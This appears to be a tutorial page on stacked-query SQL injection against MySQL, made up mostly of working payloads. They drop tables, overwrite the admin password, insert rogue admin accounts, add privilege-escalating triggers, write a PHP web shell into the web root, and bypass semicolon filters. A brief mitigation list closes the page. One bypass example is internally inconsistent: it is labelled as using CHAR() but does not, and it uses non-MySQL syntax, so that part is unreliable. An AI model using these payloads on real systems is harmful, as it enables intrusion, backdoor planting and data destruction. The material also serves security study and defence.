---
title: Stacked Queries
description: Executing multiple SQL statements in a single injection
category: Advanced Techniques
order: 18
tags: ["stacked queries", "multiple statements", "advanced injection"]
lastUpdated: 2023-03-15
---

## Stacked Queries

Stacked queries (also known as query stacking or multi-queries) allow attackers to execute multiple SQL statements in a single injection. This technique significantly extends the capabilities of SQL injection attacks beyond simple data extraction.

### Basic Syntax

In MySQL, multiple SQL statements can be separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE users;
```

This executes two separate queries: first selecting data, then dropping the table.

### Prerequisites for Stacked Queries

For stacked queries to work, two conditions must be met:

1. The database API must support multiple statements in a single query
2. The application must use a database connector that supports multi-queries

In PHP, for example:
- `mysqli_multi_query()` supports stacked queries
- `mysqli_query()` does not support stacked queries

### Detection

To test if stacked queries are possible:

```sql
1'; SELECT SLEEP(5); -- -
```

If the application pauses for 5 seconds, it likely supports stacked queries.

### Examples of Stacked Queries

#### Data Modification

```sql
1'; UPDATE users SET password='hacked' WHERE username='admin'; -- -
```

#### Creating a New Admin User

```sql
1'; INSERT INTO users (username, password, role) VALUES ('hacker', MD5('owned'), 'admin'); -- -
```

#### Database Schema Manipulation

```sql
1'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255); -- -
```

#### Executing Stored Procedures

```sql
1'; CALL some_stored_procedure(); -- -
```

### Advanced Exploitation

#### Writing to Files

If MySQL has the FILE privilege:

```sql
1'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; -- -
```

#### Creating Stored Procedures or Functions

```sql
1'; CREATE PROCEDURE backdoor() BEGIN SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'; END; -- -
```

#### Creating Database Triggers

```sql
1'; CREATE TRIGGER after_user_insert AFTER INSERT ON users FOR EACH ROW BEGIN UPDATE users SET role='admin' WHERE id=NEW.id; END; -- -
```

#### Setting Variables

```sql
1'; SET @var = (SELECT password FROM users WHERE username='admin'); SELECT @var; -- -
```

### Practical Attack Pattern

A comprehensive attack might look like:

```sql
1'; 
-- Check privileges
SELECT user,file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1);
-- Extract data
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
-- Create backdoor
INSERT INTO users (username, password, is_admin) VALUES ('backdoor', MD5('secret'), 1);
-- -
```

### Bypassing Filters

Some applications filter or escape semicolons. Bypasses include:

```sql
-- URL encoding
1'%3B%20INSERT%20INTO%20users...

-- Using CHAR() to build semicolon
1'; EXECUTE IMMEDIATE CONCAT('SEL','ECT * FROM users'); -- -

-- Using alternate syntax for some operations
1' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt' -- -
```

### Limitations

1. Many applications use database APIs that don't support multiple statements
2. Web Application Firewalls often block semicolons in input
3. Some database operations require elevated privileges

### Mitigation

To prevent stacked query attacks:

1. Use database libraries that don't support multi-statements by default
2. Implement proper parameterized queries
3. Apply the principle of least privilege to database users
4. Filter and validate all user input
5. Use a WAF to detect and block SQL injection attempts